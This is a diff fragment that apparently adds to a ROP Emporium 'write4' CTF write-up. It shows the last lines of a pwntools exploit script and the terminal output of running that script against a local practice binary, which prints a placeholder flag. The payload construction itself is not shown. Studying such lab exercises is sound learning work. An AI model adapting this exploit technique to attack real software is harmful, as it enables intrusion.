@@ -228,3 +228,15 @@ p.recvuntil('\n> ')
 p.sendline(payload)
 p.interactive()
 ```
+
+```sh
+$ python3 exploit.py 
+[+] Starting local process './write4': pid 162228
+exploit.py:33: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.recvuntil('\n> ')
+[*] Switching to interactive mode
+Thank you!
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+$
+```
